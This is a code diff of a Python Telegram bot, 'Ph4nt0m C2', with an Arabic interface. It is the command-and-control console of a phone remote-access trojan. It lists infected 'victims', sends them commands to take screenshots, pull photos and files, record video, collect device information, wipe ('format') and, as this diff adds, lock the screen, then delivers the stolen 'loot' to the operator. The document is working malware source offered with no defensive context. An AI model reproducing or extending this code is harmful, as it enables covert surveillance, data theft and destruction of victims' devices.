@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Ph4nt0m C2 Bot - Flash, Device Info, Auto-Loot
+Ph4nt0m C2 Bot - مع قفل الشاشة وسحب المجلدات
 """
 import os, json, threading, requests, base64, time
 from flask import Flask
@@ -38,9 +38,7 @@ async def send_file_to_telegram(update, data_bytes, filename, caption):
         await update.message.reply_document(document=data_bytes, filename=filename, caption=caption)
     except: pass
 
-# -----------------------------------------------
-# الواجهات
-# -----------------------------------------------
+# ---------- لوحات ----------
 def get_victims_keyboard():
     keyboard = []
     for vid, info in get_online_victims().items():
@@ -63,6 +61,7 @@ def get_control_keyboard():
         [InlineKeyboardButton("🔦 فلاش تشغيل", callback_data='flash_on'),
          InlineKeyboardButton("💡 فلاش إطفاء", callback_data='flash_off')],
         [InlineKeyboardButton("📋 معلومات الجهاز", callback_data='device_info')],
+        [InlineKeyboardButton("🔒 قفل الشاشة", callback_data='lock_screen')],
         [InlineKeyboardButton("💣 فرمتة", callback_data='format'),
          InlineKeyboardButton("🚫 مسح الجلسة", callback_data='leave')],
         [InlineKeyboardButton("🔙 رجوع", callback_data='back_to_victims')]
@@ -81,20 +80,17 @@ def get_photo_folders_keyboard():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# -----------------------------------------------
-# مساعد: إرسال أحدث المسروقات تلقائياً
-# -----------------------------------------------
 async def send_latest_loot(update, vid):
     loot = db.reference(f'victims/{vid}/loot').get()
     if not loot: return
-    items = list(loot.items())[-5:]  # آخر 5 مسروقات
+    items = list(loot.items())[-5:]
     for key, item in items:
         typ = item.get('type','?')
         name = item.get('name', typ)
         url = item.get('url')
         data_b64 = item.get('data')
         info = item.get('info')
-        if info:  # معلومات الجهاز
+        if info:
             await update.message.reply_text(f"📋 معلومات الجهاز:\n{json.dumps(info, indent=2, ensure_ascii=False)}")
             continue
         if url:
@@ -108,12 +104,9 @@ async def send_latest_loot(update, vid):
             except: pass
         elif data_b64:
             try:
-                await send_file_to_telegram(update, base64.b64decode(data_b64), f"{name}.bin", f"📎 {name} (قديم)")
+                await send_file_to_telegram(update, base64.b64decode(data_b64), f"{name}.bin", f"📎 {name}")
             except: pass
 
-# -----------------------------------------------
-# المعالج الرئيسي
-# -----------------------------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("⚡ **Ph4nt0m C2**", reply_markup=InlineKeyboardMarkup([
         [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
@@ -147,7 +140,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         vid = data.split('_',1)[1]
         vics = get_online_victims()
         if vid not in vics:
-            await query.edit_message_text("الجهاز غير متصل.", reply_markup=get_victims_keyboard())
+            await query.edit_message_text("غير متصل.", reply_markup=get_victims_keyboard())
             return
         current_victim[uid] = vid
         await query.edit_message_text(f"✅ **{vid}**", reply_markup=get_control_keyboard())
@@ -155,7 +148,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     vid = current_victim.get(uid)
     if not vid:
-        await query.edit_message_text("انتهت الجلسة. اختر جهاز:", reply_markup=get_victims_keyboard())
+        await query.edit_message_text("انتهت الجلسة.", reply_markup=get_victims_keyboard())
         return
 
     if data == 'leave':
@@ -173,14 +166,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         folder_key = data.split('_',1)[1]
         db.reference(f'victims/{vid}/command').set({"action":"get_photos","folder":folder_key})
         await query.edit_message_text(f"✅ جاري سحب صور: {folder_key}", reply_markup=get_control_keyboard())
-        time.sleep(2)
+        time.sleep(3)
         await send_latest_loot(query, vid)
         return
     if data == 'back_to_control':
         await query.edit_message_text("لوحة التحكم:", reply_markup=get_control_keyboard())
         return
 
-    # معلومات الجهاز
     if data == 'device_info':
         db.reference(f'victims/{vid}/command').set({"action":"device_info"})
         await query.edit_message_text("✅ جاري جمع معلومات الجهاز...", reply_markup=get_control_keyboard())
@@ -188,16 +180,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await send_latest_loot(query, vid)
         return
 
-    # بقية الأوامر
+    # الأوامر العادية
     params = {}
     if data == 'vibrate': params['duration'] = 5000
     elif data == 'record_video': params['duration'] = 10
     cmd = {"action": data, **params}
     db.reference(f'victims/{vid}/command').set(cmd)
     await query.edit_message_text(f"✅ تم: {data}", reply_markup=get_control_keyboard())
-    # إرسال المسروقات تلقائياً بعد أوامر اللقطات
     if data in ('screenshot', 'get_files', 'get_photos'):
-        time.sleep(2)
+        time.sleep(3)
         await send_latest_loot(query, vid)
 
 def main():
